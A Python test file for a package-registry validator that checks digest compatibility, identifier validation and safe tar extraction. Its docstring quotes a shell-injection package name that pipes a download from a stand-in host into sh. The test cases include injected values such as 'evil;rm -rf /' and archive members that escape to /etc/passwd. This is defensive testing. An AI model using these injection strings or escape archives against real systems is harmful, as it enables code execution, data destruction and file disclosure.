#!/usr/bin/env python3
"""
Safety tests for `scripts/validate_packages.py`.

Runs standalone: `python3 scripts/test_validate_packages.py`

These exist because the code they cover replaced something exploitable. The
legacy `backend/validate.py` interpolated an unvalidated package name into
`subprocess.run(..., shell=True)` across four commands and into `rm -rf`, and
built filesystem paths from the same value — so a publisher could name a package
`x;curl evil|sh` and get command execution on the validation host (defect D7 /
D40 in docs/BASELINE_AUDIT.md).

Every case below is something the old code would have mishandled.
"""

from __future__ import annotations

import importlib.util
import io
import sys
import tarfile
import tempfile
import warnings
from pathlib import Path

warnings.filterwarnings("ignore")  # numpy int64 overflow in the reference impl

ROOT = Path(__file__).resolve().parent
_spec = importlib.util.spec_from_file_location("validate_packages", ROOT / "validate_packages.py")
v = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(v)

PASSED = 0
FAILED: list[str] = []


def check(label: str, condition: bool, detail: str = "") -> None:
    global PASSED
    if condition:
        PASSED += 1
        print(f"  PASS  {label}")
    else:
        FAILED.append(label)
        print(f"  FAIL  {label} {detail}")


# ── FNV-1a digest compatibility ───────────────────────────────────────────────
#
# The digest must match what fpm writes into fpm_model.json. That is NOT
# textbook 64-bit FNV-1a: the legacy check_digests.py used the 32-bit offset
# basis and 32-bit prime but did the arithmetic in numpy int64, so it wrapped at
# 64 bits. Correcting it to textbook FNV-1a would change every digest and make
# the registry disagree with every fpm client, so the hybrid is reproduced.


def _reference_numpy_hash(text: str) -> int:
    """The original numpy implementation, bit-for-bit."""
    import numpy as np

    h = np.int64(2166136261)
    prime = np.int64(16777619)
    for line in text:
        for char in line:
            h ^= np.int64(ord(char))
            h *= prime
    # numpy int64 is signed; the caller compares bit patterns.
    return int(h) & 0xFFFFFFFFFFFFFFFF


def test_fnv1a() -> None:
    print("fnv1a digest (defect D24 — fpm compatibility)")
    for sample in [
        "",
        "a",
        "foobar",
        "x = 1\n",
        "module mymod\n  implicit none\nend module mymod\n",
        "unicode ✓ ÿ",
        "x" * 5000,
    ]:
        check(
            f"matches the legacy numpy scheme for {sample[:24]!r}",
            v.fnv1a(sample) == _reference_numpy_hash(sample),
            f"got {v.fnv1a(sample)}, expected {_reference_numpy_hash(sample)}",
        )

    # Pin the exact values, so a change to the constants cannot pass unnoticed.
    check("empty string", v.fnv1a("") == 2166136261)
    check("'foobar'", v.fnv1a("foobar") == 2997188912924653928)
    check("is not textbook 64-bit FNV-1a", v.fnv1a("") != 0xCBF29CE484222325)


# ── identifier safety ─────────────────────────────────────────────────────────


def test_identifiers() -> None:
    print("identifier validation (defect D7 — shell injection / traversal)")
    rejected = [
        "evil;rm -rf /",
        "evil$(id)",
        "evil`id`",
        "evil|cat",
        "evil&&ls",
        "../../etc",
        "a/b",
        "a\\b",
        "..",
        ".",
        "...",
        "a..b",
        "",
        "a b",
        "a\nb",
        "x" * 65,
    ]
    for value in rejected:
        check(f"rejects {value!r}", not v.is_safe_identifier(value))

    for value in ["json-fortran", "hdf5", "my_pkg", "1.0.0", "0.10.0-rc.1", "A.b_c-1", "v2"]:
        check(f"accepts {value!r}", v.is_safe_identifier(value))


# ── archive extraction ────────────────────────────────────────────────────────


def _probe(build, max_member=None, max_total=None, max_members=None):
    saved = (v.MAX_MEMBER_BYTES, v.MAX_TOTAL_BYTES, v.MAX_MEMBERS)
    v.MAX_MEMBER_BYTES = max_member or saved[0]
    v.MAX_TOTAL_BYTES = max_total or saved[1]
    v.MAX_MEMBERS = max_members or saved[2]
    try:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            buf = io.BytesIO()
            with tarfile.open(fileobj=buf, mode="w:gz") as tar:
                build(tar)
            archive = root / "a.tar.gz"
            archive.write_bytes(buf.getvalue())
            try:
                v.safe_extract(archive, root / "out")
                return "allowed"
            except v.VerdictError as err:
                return f"blocked:{err.reason}"
    finally:
        v.MAX_MEMBER_BYTES, v.MAX_TOTAL_BYTES, v.MAX_MEMBERS = saved


def _member(name, data=b"pwned!!"):
    def build(tar):
        info = tarfile.TarInfo(name)
        info.size = len(data)
        tar.addfile(info, io.BytesIO(data))

    return build


def _members(entries):
    def build(tar):
        for name, data in entries:
            info = tarfile.TarInfo(name)
            info.size = len(data)
            tar.addfile(info, io.BytesIO(data))

    return build


def _symlink(name, target):
    def build(tar):
        info = tarfile.TarInfo(name)
        info.type = tarfile.SYMTYPE
        info.linkname = target
        tar.addfile(info)

    return build


def _hardlink(name, target):
    def build(tar):
        info = tarfile.TarInfo(name)
        info.type = tarfile.LNKTYPE
        info.linkname = target
        info.size = 0
        tar.addfile(info)

    return build


def test_extraction_blocks_escapes() -> None:
    print("safe_extract — traversal and link escapes")
    cases = [
        ("member ../ traversal", _member("../escape.txt"), {}),
        ("member absolute path", _member("/tmp/escape.txt"), {}),
        ("member nested traversal", _member("a/../../escape.txt"), {}),
        ("symlink to an absolute path", _symlink("l", "/etc/passwd"), {}),
        ("symlink escaping via ..", _symlink("l", "../../etc/passwd"), {}),
        ("symlink nested absolute", _symlink("a/l", "/etc/passwd"), {}),
        ("hardlink to an absolute path", _hardlink("hl", "/etc/passwd"), {}),
        ("member over the size cap", _member("big", b"x" * 128), {"max_member": 64}),
        ("archive over the total cap", _members([("a", b"x" * 200), ("b", b"x" * 200)]), {"max_total": 300}),
        ("too many members", _members([(f"f{i}", b"x") for i in range(20)]), {"max_members": 5}),
    ]
    for label, build, kwargs in cases:
        result = _probe(build, **kwargs)
        check(f"blocks {label}", "blocked" in result, f"-> {result}")


def test_extraction_allows_legitimate() -> None:
    print("safe_extract — legitimate archives must still work")
    cases = [
        ("a benign in-archive symlink", _symlink("l", "README.md"), {}, "allowed"),
        ("deep legitimate nesting", _member("a/b/c/d/e.f90"), {}, "allowed"),
        ("a member exactly at the cap", _member("a", b"x" * 200), {"max_member": 200}, "allowed"),
        (
            "an archive exactly at the total cap",
            _members([("a", b"x" * 150), ("b", b"x" * 150)]),
            {"max_total": 300},
            "allowed",
        ),
    ]
    for label, build, kwargs, expected in cases:
        result = _probe(build, **kwargs)
        check(f"allows {label}", result == expected, f"-> {result}")


def test_legitimate_package_round_trip() -> None:
    print("a real fpm package extracts, parses and digests")
    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp)
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w:gz") as tar:
            for name, data in [
                ("fpm.toml", b'name = "json-fortran"\nversion = "1.0.0"\ndescription = "JSON"\n'),
                ("README.md", b"# json-fortran\n"),
                ("src/json.f90", b"module json\nend module json\n"),
                ("docs/api/deep.f90", b"module deep\nend module deep\n"),
            ]:
                info = tarfile.TarInfo(name)
                info.size = len(data)
                tar.addfile(info, io.BytesIO(data))
        archive = root / "ok.tar.gz"
        archive.write_bytes(buf.getvalue())
        out = root / "out"

        v.safe_extract(archive, out)
        extracted = sorted(str(p.relative_to(out)) for p in out.rglob("*") if p.is_file())
        check("extracts every file", len(extracted) == 4, f"got {extracted}")

        model = v.parse_fpm_toml(out)
        check("parses fpm.toml", model.get("name") == "json-fortran", f"got {model}")

        digests = v.collect_digests(out)
        # fpm_model.json and README.md are excluded by design.
        check("digests every source file", "src/json.f90" in digests, f"got {sorted(digests)}")
        check("excludes README.md", "README.md" not in digests)
        # Digests are decimal strings because they travel through JSON in the
        # validation callback payload. Values above 2^63 would not survive a
        # round trip through a JavaScript number, which is the reason for the
        # string encoding.
        check(
            "digests are unsigned decimal strings",
            all(isinstance(d, str) and d.isdigit() for d in digests.values()),
            f"got {digests}",
        )

        # A missing fpm.toml must be a clean verdict, not a traceback.
        bare = root / "bare"
        bare.mkdir()
        try:
            v.parse_fpm_toml(bare)
            check("missing fpm.toml is rejected", False)
        except v.VerdictError as err:
            check("missing fpm.toml is rejected", err.reason == "fpm_toml_missing")


def main() -> int:
    test_fnv1a()
    test_identifiers()
    test_extraction_blocks_escapes()
    test_extraction_allows_legitimate()
    test_legitimate_package_round_trip()

    print()
    if FAILED:
        print(f"{PASSED} passed, {len(FAILED)} FAILED: {FAILED}")
        return 1
    print(f"{PASSED} passed, 0 failed")
    return 0


if __name__ == "__main__":
    sys.exit(main())